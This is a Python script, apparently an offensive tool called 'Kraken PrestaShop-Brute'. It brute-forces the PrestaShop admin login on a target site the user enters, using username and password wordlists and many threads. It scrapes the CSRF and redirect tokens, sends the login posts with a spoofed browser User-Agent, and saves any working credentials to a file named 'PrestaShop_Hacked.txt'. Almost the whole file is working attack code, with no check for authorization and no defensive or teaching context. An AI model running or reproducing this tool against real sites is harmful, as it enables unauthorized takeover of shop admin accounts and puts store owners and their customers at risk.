import os
import sys
import time
import re
import requests
import logging
from colorama import Fore, Style, init
from random import choice
import pyfiglet
from threading import Thread, Lock
from queue import Queue


init(autoreset=True)


logging.basicConfig(filename=os.path.join('Logs', 'prestashop_brute.log'),
                    level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


script_dir = os.path.dirname(os.path.realpath(__file__))
results_dir = os.path.join(script_dir, 'Results')
logs_dir = os.path.join(script_dir, 'Logs')
wordlists_dir = os.path.join(script_dir, "..", "wordlists")


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


output_lock = Lock()

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken PrestaShop-Brute", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def status(msg):
    """Prints status messages."""
    with output_lock:
        print(Fore.CYAN + "[*] " + msg)

def success(msg):
    """Prints success messages."""
    with output_lock:
        print(Fore.GREEN + "[+] " + msg)

def error(msg):
    """Prints error messages."""
    with output_lock:
        print(Fore.RED + "[-] " + msg)

class PrestaShopBruteForce:
    def __init__(self):
        clear_console()
        display_banner()

        self.site, self.usernames, self.passwords, self.num_threads = self.get_user_input()
        self.queue = Queue()
        self.threads = []
        self.total_attempts = len(self.usernames) * len(self.passwords)
        self.attempt_number = 0

        
        for username in self.usernames:
            for password in self.passwords:
                self.queue.put((username, password))

        
        for _ in range(self.num_threads):
            t = Thread(target=self.worker)
            t.start()
            self.threads.append(t)

        
        self.queue.join()

        success("[Completed] All password attempts finished.")

    def get_user_input(self):
        """Gathers user input for the PrestaShop brute force operation."""
        site = input(Fore.WHITE + '[i] Enter the target: ').strip()
        if not site.startswith(('http://', 'https://')):
            site = 'http://' + site
        site = site.rstrip('/')

        use_username_list = input(Fore.WHITE + "[i] Use username list? (Y/n): ").strip().lower()
        if use_username_list != 'n':
            user_file = input(Fore.WHITE + "[i] Username list (default: users.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "users.txt")
            status(f"Loading usernames from {user_file}...")
            if not os.path.isfile(user_file):
                error(f"Username list not found: {user_file}")
                logging.error(f"Username list not found: {user_file}")
                sys.exit(1)
            with open(user_file, 'r', encoding='utf-8') as f:
                usernames = [line.strip() for line in f if line.strip()]
            if not usernames:
                error("No usernames found in the list.")
                logging.error("No usernames found.")
                sys.exit(1)
            success(f"{len(usernames)} usernames loaded from the list.")
        else:
            username = input(Fore.WHITE + "[i] Enter username: ").strip()
            if not username:
                error("No username provided.")
                logging.error("No username provided.")
                sys.exit(1)
            usernames = [username]
            success(f"Username entered manually: {username}")

        passwordlist = input(Fore.WHITE + "[i] Password list (default: passwords.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "passwords.txt")
        status(f"Loading passwords from {passwordlist}...")
        if not os.path.isfile(passwordlist):
            error(f"Password list not found: {passwordlist}")
            logging.error(f"Password list not found: {passwordlist}")
            sys.exit(1)
        with open(passwordlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        success(f"{len(passwords)} passwords loaded.")

        num_threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10, press Enter for default): ") or 10)

        status("All inputs received successfully.")
        print(Fore.YELLOW + "-"*60)
        print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
        return site, usernames, passwords, num_threads

    def worker(self):
        """Thread worker function to process the queue."""
        while not self.queue.empty():
            username, password = self.queue.get()
            self.prestashop(username, password)
            self.queue.task_done()

    def prestashop(self, username, password):
        """Attempts to log in to the PrestaShop site using provided credentials."""
        try:
            sess = requests.session()

            
            response = sess.get(f'{self.site}/administration/index.php?controller=AdminLogin', timeout=10)

            
            redirect_token_match = re.search(r'name="redirect" value="(.+?)"', response.text)
            redirect_token = redirect_token_match.group(1) if redirect_token_match else ''

            
            login_token_match = re.search(r'controller=AdminLogin&token=(.+?)"', response.text)
            login_token = login_token_match.group(1) if login_token_match else ''

            post_data = {
                'ajax': '1',
                'controller': 'AdminLogin',
                'submitLogin': '1',
                'passwd': password,
                'email': username,
                'redirect': redirect_token
            }

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f'{self.site}/administration/index.php?controller=AdminLogin&token={login_token}',
            }

            url = f"{self.site}/administration/index.php?rand={int(time.time() * 1000)}"
            self.attempt_number += 1  

            
            response = sess.post(url, data=post_data, headers=headers, timeout=10)

            
            if '"hasErrors":false' in response.text and '"redirect":"' in response.text:
                success_msg = (
                    f"\n[{self.attempt_number}/{self.total_attempts}] Tested - {username}:{password}\n"
                    f"\n{Fore.GREEN + Style.BRIGHT}SUCCESS!{Style.RESET_ALL} Valid credentials found!\n"
                    f"{Fore.YELLOW}{'-'*40}\n"
                    f"URL: {Fore.CYAN}{self.site}/administration/index.php{Style.RESET_ALL}\n"
                    f"Username: {Fore.YELLOW}{username}{Style.RESET_ALL}\n"
                    f"Password: {Fore.YELLOW}{password}{Style.RESET_ALL}\n"
                    f"{Fore.YELLOW}{'-'*40}\n"
                )
                sys.stdout.write('\033[K')  
                print(success_msg)
                with open(os.path.join(results_dir, 'PrestaShop_Hacked.txt'), 'a') as writer:
                    writer.write(success_msg)
            else:
                with output_lock:
                    sys.stdout.write(f'\r[{self.attempt_number}/{self.total_attempts}] Tested - Current: {username}:{password}')
                    sys.stdout.flush()
        except Exception as e:
            logging.error(f"Login attempt error: {str(e)}")
            error(f"Login attempt error: {str(e)}")

def main():
    PrestaShopBruteForce()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
        print(Fore.YELLOW + "Script interrupted by user.")
